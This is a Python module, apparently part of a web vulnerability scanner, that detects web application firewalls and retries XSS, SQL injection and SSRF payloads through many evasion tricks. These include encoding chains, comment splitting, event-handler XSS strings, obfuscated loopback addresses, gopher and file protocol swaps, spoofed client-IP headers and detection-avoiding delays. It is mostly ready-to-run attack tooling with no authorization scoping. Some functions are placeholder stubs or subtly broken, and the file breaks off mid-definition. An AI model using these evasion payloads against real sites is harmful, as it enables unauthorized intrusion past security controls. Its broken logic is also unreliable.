#!/usr/bin/env python3
"""
Aggressive Testing Module with WAF Evasion Techniques
Handles advanced payload testing with anti-detection methods
"""

import requests
import time
import random
import string
import urllib.parse
import base64
import html
import json
import logging
from typing import Dict, List, Optional, Tuple
import re
from itertools import cycle
import hashlib
import socket
from collections import defaultdict
from datetime import datetime

logger = logging.getLogger(__name__)

class MLEvasionOptimizer:
    """Use ML to optimize evasion techniques based on WAF responses"""
    def __init__(self):
        self.success_patterns = defaultdict(list)
        self.failure_patterns = defaultdict(list)
    def learn_from_response(self, technique: str, payload: str, response: requests.Response, success: bool):
        features = self._extract_features(payload, response)
        if success:
            self.success_patterns[technique].append(features)
        else:
            self.failure_patterns[technique].append(features)
    def predict_best_technique(self, waf_type: str, payload_type: str) -> str:
        scores = {}
        for technique in self.get_techniques():
            success_rate = self._calculate_success_rate(technique, waf_type)
            scores[technique] = success_rate
        return max(scores.items(), key=lambda x: x[1])[0] if scores else None
    def get_techniques(self):
        return ['encoding', 'case_variation', 'comment_insertion', 'whitespace_manipulation', 'parameter_pollution', 'header_manipulation']
    def _calculate_success_rate(self, technique, waf_type):
        # Dummy: in real use, would analyze patterns
        return random.uniform(0.5, 1.0)
    def _extract_features(self, payload, response):
        return {'payload_len': len(payload), 'status': response.status_code}

class StealthManager:
    """Manage request patterns to avoid detection"""
    def __init__(self):
        self.request_history = []
        self.detection_threshold = 0.8
    def calculate_next_delay(self) -> float:
        base_delay = 1.0
        recent_requests = self.request_history[-10:]
        if recent_requests:
            success_rate = sum(1 for r in recent_requests if not r.get('blocked')) / len(recent_requests)
        else:
            success_rate = 1.0
        if success_rate < 0.5:
            base_delay *= 5
        jitter = random.uniform(0.5, 1.5)
        hour = datetime.now().hour
        time_factor = 0.8 if 9 <= hour <= 17 else 1.2
        return base_delay * jitter * time_factor

class WAFIntelligence:
    """Collect and analyze WAF behavior patterns"""
    def __init__(self):
        self.waf_signatures = {}
        self.evasion_success_rates = defaultdict(lambda: defaultdict(float))
    def generate_intelligence_report(self, target: str) -> dict:
        report = {
            'target': target,
            'waf_detected': None,
            'confidence': 0,
            'successful_techniques': [],
            'failed_techniques': [],
            'recommendations': [],
            'risk_assessment': {}
        }
        waf_type = self._identify_waf(target)
        report['waf_detected'] = waf_type
        if waf_type:
            techniques = self.evasion_success_rates[waf_type]
            report['successful_techniques'] = [t for t, rate in techniques.items() if rate > 0.7]
        report['recommendations'] = self._generate_recommendations(waf_type)
        return report
    def _identify_waf(self, target):
        # Dummy: in real use, would analyze signatures
        return None
    def _generate_recommendations(self, waf_type):
        return ["Rotate IPs", "Try chained encodings"] if waf_type else ["Standard evasion"]

class AdvancedSessionManager:
    """Sophisticated session management for evasion"""
    def __init__(self):
        self.session_pool = []
        self.proxy_pool = []
        self.fingerprints = []
    def create_unique_session(self) -> requests.Session:
        session = requests.Session()
        # TLSAdapter and cookie generation would be implemented here
        session.headers.update(self._generate_browser_headers())
        return session
    def _generate_browser_headers(self) -> dict:
        browsers = [
            {
                'User-Agent': 'Mozilla/5.0...',
                'Accept': 'text/html,application/xhtml+xml...',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
            }
        ]
        return random.choice(browsers)

class WAFEvasionTester:
    """Advanced vulnerability testing with WAF evasion capabilities"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.aggressive_mode = self.config.get('aggressive_mode', True)
        self.max_retries = self.config.get('max_retries', 3)
        self.base_delay = self.config.get('base_delay', 1.0)
        self.randomize_delays = self.config.get('randomize_delays', True)
        
        # WAF detection patterns
        self.waf_indicators = {
            'cloudflare': [
                'cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status',
                'error 1020', 'access denied', 'ray id'
            ],
            'akamai': [
                'akamai', 'akamai ghost', 'akadns', 'reference #'
            ],
            'aws_waf': [
                'aws', 'x-amzn-requestid', 'x-amz-cf-id', 'forbidden'
            ],
            'imperva': [
                'imperva', 'incapsula', 'visid_incap', '_incap_ses'
            ],
            'f5_bigip': [
                'bigip', 'f5', 'tmui', 'bigipserver'
            ],
            'barracuda': [
                'barracuda', 'barra', 'bnmobilemessaging'
            ],
            'sucuri': [
                'sucuri', 'cloudproxy', 'x-sucuri-id'
            ],
            'generic': [
                'blocked', 'forbidden', 'access denied', 'suspicious activity',
                'security violation', 'threat detected', 'malicious request'
            ]
        }
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # Session management
        self.sessions = []
        self._create_sessions()
        
        # Initialize evasion optimizer, stealth manager, and intelligence
        self.evasion_optimizer = MLEvasionOptimizer()
        self.stealth_manager = StealthManager()
        self.intelligence = WAFIntelligence()
        
    def _create_sessions(self):
        """Create multiple sessions with different characteristics"""
        for i in range(3):  # Create 3 different sessions
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            self.sessions.append(session)
    
    def test_payload_aggressive(self, url: str, payload_data: Dict) -> Dict:
        """Perform aggressive testing with WAF evasion"""
        logger.info(f"🚀 Aggressive testing: {payload_data.get('type')} on {url}")
        
        # Initial WAF detection
        waf_info = self._detect_waf(url)
        if waf_info['detected']:
            logger.warning(f"⚠️ WAF detected: {waf_info['type']} - Using evasion techniques")
        
        # Test with multiple evasion techniques
        results = []
        
        # Standard test first
        standard_result = self._test_standard_payload(url, payload_data)
        if standard_result.get('vulnerable'):
            return standard_result
        
        # If standard test failed or blocked, try evasion techniques
        evasion_techniques = self._get_evasion_techniques(payload_data.get('type'))
        
        for technique_name, technique_func in evasion_techniques.items():
            logger.debug(f"Trying evasion technique: {technique_name}")
            
            try:
                evaded_payloads = technique_func(payload_data)
                for evaded_payload in evaded_payloads:
                    result = self._test_evaded_payload(url, evaded_payload, technique_name)
                    if result.get('vulnerable'):
                        result['evasion_technique'] = technique_name
                        result['waf_info'] = waf_info
                        return result
                    
                    # Add delay between attempts
                    self._smart_delay()
                    
            except Exception as e:
                logger.debug(f"Evasion technique {technique_name} failed: {e}")
                continue
        
        # If all evasion failed, return best attempt
        return {
            'vulnerable': False,
            'waf_detected': waf_info['detected'],
            'waf_type': waf_info.get('type'),
            'evasion_attempted': True,
            'techniques_tried': list(evasion_techniques.keys())
        }
    
    def _detect_waf(self, url: str) -> Dict:
        """Detect WAF presence and type"""
        logger.debug(f"🔍 Detecting WAF for {url}")
        
        waf_info = {
            'detected': False,
            'type': None,
            'confidence': 0,
            'indicators': []
        }
        
        try:
            # Send a malicious payload to trigger WAF
            test_payload = "' OR 1=1-- AND <script>alert('xss')</script>"
            session = random.choice(self.sessions)
            
            response = session.get(
                f"{url}?test={urllib.parse.quote(test_payload)}", 
                timeout=10, 
                verify=False
            )
            
            # Check response for WAF indicators
            response_text = response.text.lower()
            response_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            max_confidence = 0
            detected_waf = None
            
            for waf_type, indicators in self.waf_indicators.items():
                confidence = 0
                found_indicators = []
                
                for indicator in indicators:
                    if (indicator in response_text or 
                        any(indicator in header_value for header_value in response_headers.values()) or
                        any(indicator in header_name for header_name in response_headers.keys())):
                        confidence += 1
                        found_indicators.append(indicator)
                
                if confidence > max_confidence:
                    max_confidence = confidence
                    detected_waf = waf_type
                    waf_info['indicators'] = found_indicators
            
            if max_confidence > 0:
                waf_info['detected'] = True
                waf_info['type'] = detected_waf
                waf_info['confidence'] = max_confidence
                
                logger.info(f"🛡️ WAF detected: {detected_waf} (confidence: {max_confidence})")
            
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
        
        return waf_info
    
    def _advanced_waf_detection(self, url: str) -> dict:
        """Enhanced WAF detection with multiple techniques"""
        timing_signatures = []
        for i in range(3):
            start = time.time()
            response = self._send_request(url, params={'test': 'normal'})
            benign_time = time.time() - start
            start = time.time()
            response = self._send_request(url, params={'test': "' OR 1=1--"})
            malicious_time = time.time() - start
            if malicious_time > benign_time * 1.5:
                timing_signatures.append(True)
        waf_cookies = {'__cfduid': 'cloudflare', 'incap_ses': 'imperva', 'visid_incap': 'imperva', 'barra': 'barracuda'}
        response_headers = self._get_response_headers(url)
        # JavaScript challenge detection stub
        # if self._detect_js_challenge(response.text):
        #     return {'type': 'javascript_challenge', 'confidence': 'high'}
        return {'timing_signatures': timing_signatures, 'headers': response_headers}
    
    def _get_evasion_techniques(self, vuln_type: str) -> Dict:
        """Get appropriate evasion techniques for vulnerability type"""
        techniques = {
            'encoding': self._encoding_evasion,
            'case_variation': self._case_variation_evasion,
            'comment_insertion': self._comment_insertion_evasion,
            'whitespace_manipulation': self._whitespace_evasion,
            'parameter_pollution': self._parameter_pollution_evasion,
            'header_manipulation': self._header_manipulation_evasion
        }
        
        # Add type-specific techniques
        if vuln_type and 'xss' in vuln_type.lower():
            techniques.update({
                'html_encoding': self._html_encoding_evasion,
                'javascript_evasion': self._javascript_evasion,
                'event_handler_evasion': self._event_handler_evasion
            })
        
        if vuln_type and 'sql' in vuln_type.lower():
            techniques.update({
                'sql_comment_evasion': self._sql_comment_evasion,
                'union_evasion': self._union_evasion,
                'hex_encoding': self._hex_encoding_evasion
            })
        
        if vuln_type and 'ssrf' in vuln_type.lower():
            techniques.update({
                'url_encoding': self._url_encoding_evasion,
                'ip_obfuscation': self._ip_obfuscation_evasion,
                'protocol_confusion': self._protocol_confusion_evasion
            })
        
        return techniques
    
    def _test_standard_payload(self, url: str, payload_data: Dict) -> Dict:
        """Test standard payload without evasion"""
        try:
            session = random.choice(self.sessions)
            parameter = payload_data.get('parameter', 'q')
            payload = payload_data.get('payload', '')
            
            # Test GET
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            response = session.get(test_url, timeout=10, verify=False)
            
            # Check for vulnerability indicators
            return self._analyze_response(response, payload_data, test_url)
            
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
    
    def _test_evaded_payload(self, url: str, evaded_payload_data: Dict, technique: str) -> Dict:
        """Test evaded payload"""
        try:
            session = random.choice(self.sessions)
            
            # Rotate user agent for this request
            session.headers['User-Agent'] = random.choice(self.user_agents)
            
            parameter = evaded_payload_data.get('parameter', 'q')
            payload = evaded_payload_data.get('payload', '')
            method = evaded_payload_data.get('method', 'GET')
            headers = evaded_payload_data.get('headers', {})
            
            # Add custom headers
            for header, value in headers.items():
                session.headers[header] = value
            
            if method.upper() == 'GET':
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                response = session.get(test_url, timeout=10, verify=False)
            else:
                data = {parameter: payload}
                response = session.post(url, data=data, timeout=10, verify=False)
                test_url = url
            
            result = self._analyze_response(response, evaded_payload_data, test_url)
            result['evasion_technique'] = technique
            
            return result
            
        except Exception as e:
            return {'vulnerable': False, 'error': str(e), 'evasion_technique': technique}
    
    def _analyze_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for vulnerability indicators"""
        vuln_type = payload_data.get('type', '').lower()
        payload = payload_data.get('payload', '')
        
        # Check if request was blocked (common WAF responses)
        if response.status_code in [403, 406, 429, 501, 502, 503]:
            return {
                'vulnerable': False,
                'blocked': True,
                'status_code': response.status_code,
                'url': test_url
            }
        
        # Type-specific analysis
        if 'xss' in vuln_type:
            return self._analyze_xss_response(response, payload_data, test_url)
        elif 'sql' in vuln_type:
            return self._analyze_sql_response(response, payload_data, test_url)
        elif 'ssrf' in vuln_type:
            return self._analyze_ssrf_response(response, payload_data, test_url)
        elif 'lfi' in vuln_type:
            return self._analyze_lfi_response(response, payload_data, test_url)
        elif 'rce' in vuln_type:
            return self._analyze_rce_response(response, payload_data, test_url)
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_xss_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for XSS indicators"""
        payload = payload_data.get('payload', '')
        
        # Look for script execution indicators
        script_indicators = ['<script>', 'onerror=', 'onload=', 'alert(', 'prompt(', 'confirm(']
        
        response_text = response.text
        
        # Check if payload is reflected and executable
        for indicator in script_indicators:
            if indicator.lower() in response_text.lower() and payload.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'type': 'XSS',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response_text, indicator),
                    'severity': 'medium',
                    'confidence': 'high'
                }
        
        # Check for DOM XSS patterns
        dom_patterns = [
            r'document\.write\s*\(\s*["\'][^"\']*' + re.escape(payload),
            r'innerHTML\s*=\s*["\'][^"\']*' + re.escape(payload),
            r'outerHTML\s*=\s*["\'][^"\']*' + re.escape(payload)
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return {
                    'vulnerable': True,
                    'type': 'DOM XSS',
                    'url': test_url,
                    'payload': payload,
                    'evidence': 'DOM manipulation pattern detected',
                    'severity': 'medium',
                    'confidence': 'medium'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_sql_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for SQL injection indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # SQL error patterns
        sql_errors = [
            r'sql syntax.*mysql',
            r'warning.*mysql_',
            r'valid mysql result',
            r'postgresql.*error',
            r'warning.*pg_',
            r'valid postgresql result',
            r'oracle error',
            r'oracle.*driver',
            r'sqlserver.*error',
            r'microsoft.*odbc.*sql server',
            r'sqlite.*error',
            r'sqlite3.*operationalerror',
            r'unterminated quoted string',
            r'unexpected end of sql command',
            r'quoted string not properly terminated'
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text):
                return {
                    'vulnerable': True,
                    'type': 'SQL Injection (Error-based)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, pattern),
                    'severity': 'high',
                    'confidence': 'high'
                }
        
        # Boolean-based blind SQLi detection (simplified)
        if 'SLEEP(' in payload.upper() or 'WAITFOR DELAY' in payload.upper():
            # This would need timing analysis in a real implementation
            pass
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_ssrf_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for SSRF indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # SSRF indicators
        ssrf_indicators = [
            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'mysql', 'postgresql', 'redis',       # Internal services
            'apache', 'nginx', 'iis',             # Web servers
            'instance-id', 'ami-id',              # AWS metadata
            'metadata.google.internal',           # GCP metadata
            'localhost', '127.0.0.1', '::1',
            'ssrf-sheriff-token', 'X-SSRF-Sheriff-Token', 'secret token'    # Localhost indicators
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return {
                    'vulnerable': True,
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, indicator),
                    'severity': 'high',
                    'confidence': 'medium'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_lfi_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for LFI indicators"""
        payload = payload_data.get('payload', '')
        response_text = response.text
        
        # LFI indicators
        lfi_indicators = [
            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'localhost', '127.0.0.1',              # hosts file
            '# Copyright', '# This file',           # Common file headers
            '[boot loader]', '[operating systems]' # boot.ini
        ]
        
        for indicator in lfi_indicators:
            if indicator in response_text:
                return {
                    'vulnerable': True,
                    'type': 'Local File Inclusion (LFI)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response_text, indicator),
                    'severity': 'high',
                    'confidence': 'high'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    def _analyze_rce_response(self, response: requests.Response, payload_data: Dict, test_url: str) -> Dict:
        """Analyze response for RCE indicators"""
        payload = payload_data.get('payload', '')
        
        # Look for command execution output
        if hasattr(payload_data, 'marker'):
            marker = payload_data['marker']
            if marker in response.text:
                return {
                    'vulnerable': True,
                    'type': 'Remote Code Execution (RCE)',
                    'url': test_url,
                    'payload': payload,
                    'evidence': self._extract_evidence(response.text, marker),
                    'severity': 'critical',
                    'confidence': 'high'
                }
        
        return {'vulnerable': False, 'url': test_url}
    
    # Evasion technique implementations
    def _encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """URL and other encoding evasion techniques"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': double_encoded,
            'description': 'Double URL encoded'
        })
        
        # Unicode encoding
        unicode_payload = ''.join(f'%u{ord(c):04x}' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': unicode_payload,
            'description': 'Unicode encoded'
        })
        
        # Mixed case encoding
        mixed_encoded = ''
        for i, char in enumerate(payload):
            if i % 2 == 0:
                mixed_encoded += urllib.parse.quote(char)
            else:
                mixed_encoded += char
        evaded_payloads.append({
            **payload_data,
            'payload': mixed_encoded,
            'description': 'Mixed case encoding'
        })
        
        return evaded_payloads
    
    def _case_variation_evasion(self, payload_data: Dict) -> List[Dict]:
        """Case variation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # All uppercase
        evaded_payloads.append({
            **payload_data,
            'payload': payload.upper(),
            'description': 'Uppercase'
        })
        
        # Alternating case
        alternating = ''.join(c.upper() if i % 2 == 0 else c.lower() 
                            for i, c in enumerate(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': alternating,
            'description': 'Alternating case'
        })
        
        # Random case
        random_case = ''.join(c.upper() if random.choice([True, False]) else c.lower() 
                            for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': random_case,
            'description': 'Random case'
        })
        
        return evaded_payloads
    
    def _comment_insertion_evasion(self, payload_data: Dict) -> List[Dict]:
        """Comment insertion evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # SQL comments
        if 'sql' in payload_data.get('type', '').lower():
            # Insert /**/ comments
            commented = payload.replace(' ', '/**/').replace('=', '/**/=/**/')
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'SQL comment insertion'
            })
            
            # Insert -- comments
            parts = payload.split(' ')
            commented = '--\n'.join(parts)
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'SQL line comment insertion'
            })
        
        # HTML comments for XSS
        if 'xss' in payload_data.get('type', '').lower():
            commented = payload.replace('<', '<!--x--><').replace('>', '><!--x-->')
            evaded_payloads.append({
                **payload_data,
                'payload': commented,
                'description': 'HTML comment insertion'
            })
        
        return evaded_payloads
    
    def _whitespace_evasion(self, payload_data: Dict) -> List[Dict]:
        """Whitespace manipulation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Tab instead of space
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '\t'),
            'description': 'Tab instead of space'
        })
        
        # Multiple spaces
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '  '),
            'description': 'Multiple spaces'
        })
        
        # Newlines
        evaded_payloads.append({
            **payload_data,
            'payload': payload.replace(' ', '\n'),
            'description': 'Newlines instead of spaces'
        })
        
        # Mixed whitespace
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        mixed = ''
        for char in payload:
            if char == ' ':
                mixed += random.choice(whitespace_chars)
            else:
                mixed += char
        evaded_payloads.append({
            **payload_data,
            'payload': mixed,
            'description': 'Mixed whitespace'
        })
        
        return evaded_payloads
    
    def _parameter_pollution_evasion(self, payload_data: Dict) -> List[Dict]:
        """HTTP parameter pollution evasion"""
        payload = payload_data.get('payload', '')
        parameter = payload_data.get('parameter', 'q')
        evaded_payloads = []
        
        # Split payload across multiple parameters
        if len(payload) > 10:
            mid = len(payload) // 2
            part1, part2 = payload[:mid], payload[mid:]
            
            evaded_payloads.append({
                **payload_data,
                'method': 'GET',
                'url_suffix': f'?{parameter}={urllib.parse.quote(part1)}&{parameter}={urllib.parse.quote(part2)}',
                'description': 'Parameter pollution - split payload'
            })
        
        # Duplicate parameters with decoy
        evaded_payloads.append({
            **payload_data,
            'method': 'GET',
            'url_suffix': f'?{parameter}=innocent&{parameter}={urllib.parse.quote(payload)}',
            'description': 'Parameter pollution - decoy first'
        })
        
        return evaded_payloads
    
    def _header_manipulation_evasion(self, payload_data: Dict) -> List[Dict]:
        """Header manipulation evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # X-Forwarded-For spoofing
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1'
            },
            'description': 'IP spoofing headers'
        })
        
        # Content-Type manipulation
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-7'
            },
            'description': 'Alternative content type'
        })
        
        # Custom headers to confuse WAF
        evaded_payloads.append({
            **payload_data,
            'headers': {
                'X-Custom-WAF-Bypass': 'true',
                'X-Real-User': 'admin',
                'X-Debug': '1'
            },
            'description': 'Custom bypass headers'
        })
        
        return evaded_payloads
    
    def _html_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """HTML encoding evasion for XSS"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # HTML entity encoding
        html_encoded = html.escape(payload)
        evaded_payloads.append({
            **payload_data,
            'payload': html_encoded,
            'description': 'HTML entity encoded'
        })
        
        # Decimal encoding
        decimal_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': decimal_encoded,
            'description': 'Decimal HTML encoding'
        })
        
        # Hex encoding
        hex_encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
        evaded_payloads.append({
            **payload_data,
            'payload': hex_encoded,
            'description': 'Hex HTML encoding'
        })
        
        return evaded_payloads
    
    def _javascript_evasion(self, payload_data: Dict) -> List[Dict]:
        """JavaScript-specific XSS evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # String concatenation
        if 'alert' in payload:
            concat_payload = payload.replace('alert', 'ale'+'rt')
            evaded_payloads.append({
                **payload_data,
                'payload': concat_payload,
                'description': 'String concatenation'
            })
        
        # Character encoding in JS
        if 'alert(' in payload:
            encoded = payload.replace('alert(', 'String.fromCharCode(97,108,101,114,116)(')
            evaded_payloads.append({
                **payload_data,
                'payload': encoded,
                'description': 'JavaScript character encoding'
            })
        
        # Template literals
        if '<script>' in payload:
            template = payload.replace('<script>', '<script>`${alert()}`</script>')
            evaded_payloads.append({
                **payload_data,
                'payload': template,
                'description': 'Template literal'
            })
        
        return evaded_payloads
    
    def _event_handler_evasion(self, payload_data: Dict) -> List[Dict]:
        """Event handler evasion for XSS"""
        evaded_payloads = []
        
        # Alternative event handlers
        event_handlers = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>'
        ]
        
        for handler in event_handlers:
            evaded_payloads.append({
                **payload_data,
                'payload': handler,
                'description': f'Event handler: {handler[:20]}...'
            })
        
        return evaded_payloads
    
    def _sql_comment_evasion(self, payload_data: Dict) -> List[Dict]:
        """SQL comment evasion techniques"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # MySQL comment variations
        mysql_comments = [
            payload.replace(' ', '/**/ '),
            payload.replace('UNION', 'UN/**/ION'),
            payload.replace('SELECT', 'SE/**/LECT'),
            payload + '-- -',
            payload + '#'
        ]
        
        for comment_payload in mysql_comments:
            evaded_payloads.append({
                **payload_data,
                'payload': comment_payload,
                'description': 'MySQL comment evasion'
            })
        
        return evaded_payloads
    
    def _union_evasion(self, payload_data: Dict) -> List[Dict]:
        """UNION-based SQL injection evasion"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # UNION variations
        union_variations = [
            payload.replace('UNION', 'UNI/**/ON'),
            payload.replace('UNION', 'UNION ALL'),
            payload.replace('UNION', '/*!12345UNION*/'),
            payload.replace('SELECT', '/*!12345SELECT*/'),
        ]
        
        for union_payload in union_variations:
            evaded_payloads.append({
                **payload_data,
                'payload': union_payload,
                'description': 'UNION evasion'
            })
        
        return evaded_payloads
    
    def _hex_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """Hex encoding evasion for SQL"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Convert strings to hex
        if "'" in payload:
            # Replace string literals with hex
            hex_payload = payload.replace("'", '0x').replace(' ', '')
            evaded_payloads.append({
                **payload_data,
                'payload': hex_payload,
                'description': 'Hex encoding'
            })
        
        return evaded_payloads
    
    def _url_encoding_evasion(self, payload_data: Dict) -> List[Dict]:
        """URL encoding evasion for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Double encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        evaded_payloads.append({
            **payload_data,
            'payload': double_encoded,
            'description': 'Double URL encoding'
        })
        
        # Partial encoding
        partial = ''
        for i, char in enumerate(payload):
            if i % 3 == 0:
                partial += urllib.parse.quote(char)
            else:
                partial += char
        evaded_payloads.append({
            **payload_data,
            'payload': partial,
            'description': 'Partial URL encoding'
        })
        
        return evaded_payloads
    
    def _ip_obfuscation_evasion(self, payload_data: Dict) -> List[Dict]:
        """IP obfuscation for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # If payload contains IP addresses, obfuscate them
        ip_patterns = [
            ('127.0.0.1', ['0x7f000001', '2130706433', '127.1', '0177.0.0.1']),
            ('localhost', ['127.0.0.1', '0x7f000001', '[::]']),
            ('192.168.1.1', ['0xc0a80101', '3232235777'])
        ]
        
        for original_ip, alternatives in ip_patterns:
            if original_ip in payload:
                for alt_ip in alternatives:
                    evaded_payloads.append({
                        **payload_data,
                        'payload': payload.replace(original_ip, alt_ip),
                        'description': f'IP obfuscation: {alt_ip}'
                    })
        
        return evaded_payloads
    
    def _protocol_confusion_evasion(self, payload_data: Dict) -> List[Dict]:
        """Protocol confusion for SSRF"""
        payload = payload_data.get('payload', '')
        evaded_payloads = []
        
        # Alternative protocols
        if 'http://' in payload:
            alternatives = [
                payload.replace('http://', 'https://'),
                payload.replace('http://', 'ftp://'),
                payload.replace('http://', 'gopher://'),
                payload.replace('http://', 'file://'),
                payload.replace('http://', 'dict://'),
                payload.replace('http://', 'ldap://')
            ]
            
            for alt in alternatives:
                evaded_payloads.append({
                    **payload_data,
                    'payload': alt,
                    'description': f'Protocol confusion'
                })
        
        return evaded_payloads
    
    def _smart_delay(self):
        """Implement smart delay to avoid rate limiting"""
        if self.randomize_delays:
            delay = self.base_delay + random.uniform(0, 2)
        else:
            delay = self.base_delay
        
        time.sleep(delay)
    
    def _extract_evidence(self, response_text: str, indicator: str, context_length: int = 300) -> str:
        """Extract evidence context around found indicator"""
        try:
            lower_text = response_text.lower()
            lower_indicator = indicator.lower()
            
            index = lower_text.find(lower_indicator)
            if index == -1:
                return "Evidence found but couldn't extract context"
            
            start = max(0, index - context_length // 2)
            end = min(len(response_text), index + context_length // 2)
            
            context = response_text[start:end]
            return f"...{context}..." if start > 0 or end < len(response_text) else context
        except:
            return "Evidence found"
    
    def _send_request(self, url, **kwargs):
        """Send a request with retries and session handling"""
        for i in range(self.max_retries):
            try:
                session = random.choice(self.sessions)
                response = session.get(url, **kwargs)
                if response.status_code == 200:
                    logger.info("Potential SSRF execution: HTTP 200 OK from {}".format(response.url))               
                # Check for WAF blocking
                if response.status_code in [403, 406, 429]:
                    logger.warning(f"Request blocked by WAF: {response.status_code} - {url}")
                    self.stealth_manager.request_history.append({'url': url, 'blocked': True})
                    self._smart_delay()
                    continue
                
                # Log successful request
                logger.info(f"Request successful: {response.status_code} - {url}")
                self.stealth_manager.request_history.append({'url': url, 'blocked': False})
                return response
            
            except Exception as e:
                logger.error(f"Request error: {e} - {url}")
                time.sleep(1)
        
        return None
    
    def _apply_encoding(self, payload, encoding):
        """Apply specific encoding to payload"""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'unicode':
            return ''.join(f'%u{ord(c):04x}' for c in payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'html_entity':
            return html.escape(payload)
        elif encoding == 'utf7':
            return payload.encode('utf-7').decode('utf-8')
        elif encoding == 'utf16':
            return payload.encode('utf-16').decode('utf-8')
        return payload
    
    def _run_false_positive_checks(self, response: requests.Response, payload_data: dict) -> dict:
        """Run checks to reduce false positive rate"""
        checks = {
            'xss': self._check_xss_false_positives,
